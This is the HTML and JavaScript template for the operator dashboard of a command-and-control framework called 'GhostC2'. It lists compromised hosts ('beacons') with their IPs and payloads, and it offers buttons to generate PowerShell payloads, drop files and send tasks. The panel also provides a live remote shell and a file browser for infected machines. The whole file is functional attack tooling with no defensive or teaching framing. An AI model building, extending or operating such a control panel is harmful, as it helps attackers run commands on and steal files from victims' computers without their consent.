<!DOCTYPE html>
<html>
<head>
    <title>GhostC2 Dashboard</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
        h1, h2 { color: #0f0; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
        th { background-color: #222; }
        input, select, button {
            background: #222;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 5px;
            font-family: monospace;
        }
        .form-section { margin-top: 40px; }
        .status { font-weight: bold; }
        tr:hover { background: #222; cursor: pointer; }

        .status-dot {
            height: 10px;
            width: 10px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 6px;
        }
        .dot-active { background-color: #0f0; box-shadow: 0 0 5px #0f0; }
        .dot-sleeping { background-color: #fa0; box-shadow: 0 0 5px #fa0; }
        .dot-dead { background-color: #f00; box-shadow: 0 0 5px #f00; }

        .tabs button {
            background: #222;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 6px 12px;
            margin-right: 10px;
            cursor: pointer;
        }

        #modal {
            display: none;
            position: fixed;
            top: 10%;
            left: 10%;
            width: 80%;
            height: 80%;
            background: #000;
            border: 2px solid #0f0;
            padding: 20px;
            overflow-y: scroll;
            z-index: 9999;
        }
        #modal h2 { color: #0f0; }
        #modal-close { float: right; cursor: pointer; color: #f00; font-weight: bold; }

        #taskModal {
            display: none;
            position: fixed;
            top: 20%;
            left: 25%;
            width: 50%;
            background: #111;
            border: 2px solid #0f0;
            padding: 20px;
            z-index: 9999;
        }
        #taskModal h3 { margin-top: 0; }
        #taskModal .close { float: right; color: #f00; cursor: pointer; }
    </style>
</head>
<body>
    <a href="/console" style="color: #0f0; text-decoration: underline;">‚Üí Open Live Console</a>
    <a href="/generate" style="color: #0f0; text-decoration: underline; margin-left: 20px;">‚Üí Generate Payload</a>
    <a href="/upload" style="color: #0f0; text-decoration: underline; margin-left: 20px;">‚Üí Upload for File Drop</a>
    <br><br>
    <form method="GET" action="/generate_ps_payload">
        <button type="submit">Generate PowerShell Payload</button>
    </form>

    <h1>üëª GhostC2 Beacon Dashboard</h1>
    <button id="toggleBtn" onclick="toggleInactive()">Hide Inactive Beacons</button>

    <table id="beacon-table">
        <thead>
            <tr>
                <th>Hostname</th>
                <th>IP</th>
                <th>Payload</th>
                <th>Status</th>
                <th>Last Seen</th>
                <th>Browse</th>
            </tr>
        </thead>
        <tbody id="beacon-body">
            <!-- Populated by JS -->
        </tbody>
    </table>

    <div class="form-section">
        <h2>Add New Task</h2>
        <form method="POST" action="/add_task">
            Hostname: <input type="text" name="hostname" required><br><br>
            Command: <input type="text" name="command" required><br><br>
            <button type="submit">Send Task</button>
        </form>
    </div>

    <div class="form-section">
        <h2>Task History</h2>
        <div class="tabs">
            <button onclick="filterTasksByActiveBeacons()">üü¢ Active Beacon Tasks</button>
            <button onclick="filterTasks('all')">üìã All</button>
            <button onclick="filterTasks('pending')">üïê Pending</button>
            <button onclick="filterTasks('dispatched')">üì§ Dispatched</button>
            <button onclick="filterTasks('done')">‚úÖ Done</button>
        </div>
        <table id="task-table">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Hostname</th>
                    <th>Command</th>
                    <th>Status</th>
                    <th>Result</th>
                </tr>
            </thead>
            <tbody>
                {% for task in tasks %}
                <tr onclick="openTaskModal('{{ task[0] }}', '{{ task[1] }}', '{{ task[2] }}', '{{ task[3] }}', `{{ task[4] | replace('\n', '\\n') }}`)">
                    <td>{{ task[0] }}</td>
                    <td>{{ task[1] }}</td>
                    <td>{{ task[2] }}</td>
                    <td>{{ task[3] }}</td>
                    <td><pre>{{ task[4] }}</pre></td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>

    <div id="taskModal">
        <div class="close" onclick="document.getElementById('taskModal').style.display='none'">[X]</div>
        <h3>üìÑ Task Detail</h3>
        <p><strong>ID:</strong> <span id="t-id"></span></p>
        <p><strong>Hostname:</strong> <span id="t-host"></span></p>
        <p><strong>Command:</strong> <span id="t-cmd"></span></p>
        <p><strong>Status:</strong> <span id="t-status"></span></p>
        <p><strong>Result:</strong></p>
        <pre id="t-result" style="white-space: pre-wrap;"></pre>
    </div>

    <div id="modal">
        <div id="modal-close" onclick="document.getElementById('modal').style.display='none'; modalOpen = false;">[X]</div>
        <h2 id="modal-title">Beacon Details</h2>
        <div id="modal-content"></div>
        <div id="modal-shell" style="margin-top: 20px;">
            <h3>Live Shell</h3>
            <form id="shell-form" onsubmit="sendShellCommand(); return false;">
                <input type="text" id="shell-input" placeholder="Enter command..." style="width: 80%;">
                <button type="submit">Send</button>
            </form>
            <pre id="shell-output">[+] Awaiting output...</pre>
        </div>
    </div>

    <script>
    let currentBeacon = "";
    let modalOpen = false;
    let showInactive = true;

    function toggleInactive() {
        showInactive = !showInactive;
        document.querySelectorAll(".beacon-row.inactive").forEach(row => {
            row.style.display = showInactive ? "" : "none";
        });
        document.getElementById("toggleBtn").textContent = showInactive ? "Hide Inactive Beacons" : "Show Inactive Beacons";
    }

    async function loadBeacons() {
        const res = await fetch("/api/beacons");
        const beacons = await res.json();
        const body = document.getElementById("beacon-body");
        body.innerHTML = "";

        beacons.forEach(b => {
            const row = document.createElement("tr");
            let statusClass = "";
            let statusDot = "";

            if (b.last_seen_seconds < 60) {
                statusDot = '<span class="status-dot dot-active"></span>Active';
            } else if (b.last_seen_seconds < 300) {
                statusDot = '<span class="status-dot dot-sleeping"></span>Sleeping';
                statusClass = "inactive";
            } else {
                statusDot = '<span class="status-dot dot-dead"></span>Dead';
                statusClass = "inactive";
            }

            row.className = `beacon-row ${statusClass}`;
            row.setAttribute("data-hostname", b.hostname);
            row.onclick = (e) => {
            // Only open details modal if user didn't click a button inside the row
                if (e.target.tagName !== 'BUTTON') showBeaconDetails(b.hostname);
            };


            row.innerHTML = `
                <td>${b.hostname}</td>
                <td>${b.ip}</td>
                <td>${b.payload}</td>
                <td class="status">${statusDot}</td>
                <td>${Math.round(b.last_seen_seconds)}s ago</td>
                <td>
                <button onclick="openFileBrowser('${b.hostname}')">üìÅ Browse</button>
                </td>
            `;

            if (!showInactive && statusClass === "inactive") {
                row.style.display = "none";
            }

            body.appendChild(row);
        });
    }

    async function showBeaconDetails(hostname) {
        currentBeacon = hostname;
        modalOpen = true;
        const res = await fetch(`/api/beacon/${hostname}`);
        const data = await res.json();
        document.getElementById("modal-title").textContent = `Beacon: ${hostname}`;

        let html = `<p><strong>IP:</strong> ${data.ip}</p>`;
        html += `<p><strong>Last Seen:</strong> ${data.timestamp}</p>`;
        html += `<p><strong>Payload:</strong> ${data.payload}</p>`;

        document.getElementById("modal-content").innerHTML = html;
        document.getElementById("modal").style.display = "block";
        loadShellOutput();
    }

    function sendShellCommand() {
        const input = document.getElementById("shell-input").value;
        if (!input || !currentBeacon) return;

        fetch("/console_send", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ hostname: currentBeacon, command: input })
        }).then(() => {
            document.getElementById("shell-input").value = "";
            document.getElementById("shell-output").textContent = "[+] Command sent. Awaiting result...";
            pollShellOutput(0);
        });
    }

    function pollShellOutput(attempts) {
        fetch(`/console_output?hostname=${currentBeacon}`)
            .then(res => res.text())
            .then(txt => {
                const outputBox = document.getElementById("shell-output");
                if (txt.includes("[+] No output yet...") && attempts < 15) {
                    setTimeout(() => pollShellOutput(attempts + 1), 2000);
                } else {
                    outputBox.textContent = txt;
                }
            });
    }

    function loadShellOutput() {
        fetch(`/console_output?hostname=${currentBeacon}`)
            .then(res => res.text())
            .then(txt => {
                document.getElementById("shell-output").textContent = txt;
            });
    }

    function openTaskModal(id, host, cmd, status, result) {
        document.getElementById("t-id").textContent = id;
        document.getElementById("t-host").textContent = host;
        document.getElementById("t-cmd").textContent = cmd;
        document.getElementById("t-status").textContent = status;
        document.getElementById("t-result").textContent = result;
        document.getElementById("taskModal").style.display = "block";
    }

    function filterTasks(status) {
        const rows = document.querySelectorAll("#task-table tbody tr");
        rows.forEach(row => {
            const rowStatus = row.children[3].textContent.trim().toLowerCase();
            if (status === "all" || rowStatus === status.toLowerCase()) {
                row.style.display = "";
            } else {
                row.style.display = "none";
            }
        });
    }

    async function filterTasksByActiveBeacons() {
        const beaconRes = await fetch("/api/beacons");
        const beacons = await beaconRes.json();
        const activeHosts = beacons
            .filter(b => b.last_seen_seconds < 60)
            .map(b => b.hostname);

        const rows = document.querySelectorAll("#task-table tbody tr");
        rows.forEach(row => {
            const hostname = row.children[1].textContent.trim();
            row.style.display = activeHosts.includes(hostname) ? "" : "none";
        });
    }


    setInterval(() => {
        loadBeacons();
        if (modalOpen && currentBeacon) showBeaconDetails(currentBeacon);
    }, 5000);

    window.onload = loadBeacons;


    let currentBrowseHost = null;
let currentBrowsePath = null;

function openFileBrowser(hostname, path=null) {
    event && event.stopPropagation && event.stopPropagation(); // So clicking doesn't open beacon modal
    currentBrowseHost = hostname;
    currentBrowsePath = path || (navigator.platform.startsWith('Win') ? 'C:\\' : '/');
    fetch('/api/browse', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({hostname: hostname, path: currentBrowsePath})
    }).then(() => {
        setTimeout(() => fetchBrowseResult(hostname), 2000);
    });
    document.getElementById('file-browser-title').textContent = `File Browser (${hostname})`;
    document.getElementById('file-browser-modal').style.display = 'block';
    document.getElementById('file-browser-table').innerHTML = '<tr><td>Loading...</td></tr>';
}

function fetchBrowseResult(hostname) {
    fetch(`/api/browse_result/${hostname}`)
        .then(res => res.json())
        .then(data => {
            if (data.entries) {
                renderFileBrowser(data.path, data.entries);
            } else if (data.error) {
                document.getElementById('file-browser-table').innerHTML = `<tr><td>${data.error}</td></tr>`;
            } else {
                setTimeout(() => fetchBrowseResult(hostname), 2000);
            }
        });
}

function renderFileBrowser(path, entries) {
    currentBrowsePath = path;
    document.getElementById('file-browser-path').textContent = path;
    let rows = '';
    // Up directory support
    if ((path !== '/' && !path.match(/^([A-Za-z]:\\|[A-Za-z]:\\\\)$/))) {
        let parent;
        if (path.includes('\\')) {
            parent = path.replace(/\\[^\\]+\\?$/, '\\');
        } else {
            parent = path.replace(/\/[^\/]+\/?$/, '/');
        }
        rows += `<tr><td colspan=3><a href="#" style="color:#0ff;" onclick="openFileBrowser(currentBrowseHost, '${parent}'); return false;">.. (Up)</a></td></tr>`;
    }
    for (let entry of entries) {
        if (entry.type === 'folder') {
            let sep = (path.endsWith('\\') || path.endsWith('/')) ? '' : (path.includes('\\') ? '\\' : '/');
            let nextPath = path + sep + entry.name + (path.includes('\\') ? '\\' : '/');
            rows += `<tr><td>üìÅ</td><td><a href="#" style="color:#0ff;" onclick="openFileBrowser(currentBrowseHost, '${nextPath}'); return false;">${entry.name}</a></td><td>Folder</td></tr>`;
        } else {
            rows += `<tr><td>üìÑ</td><td>${entry.name}</td><td>${entry.size} bytes</td></tr>`;
        }
    }
    document.getElementById('file-browser-table').innerHTML = rows;
}

function closeFileBrowser() {
    document.getElementById('file-browser-modal').style.display = 'none';
}

    </script>

    <div id="file-browser-modal" style="display:none; position:fixed; top:10%; left:20%; width:60%; height:70%; background:#111; border:2px solid #0f0; color:#0f0; overflow-y:auto; z-index:10000; padding:20px;">
        <div style="float:right; cursor:pointer; color:#f00; font-weight:bold;" onclick="closeFileBrowser()">[X]</div>
        <h2 id="file-browser-title">File Browser</h2>
        <div id="file-browser-path" style="margin-bottom:12px;"></div>
        <table style="width:100%; margin-top:10px;" id="file-browser-table"></table>
    </div>    
</body>
</html>
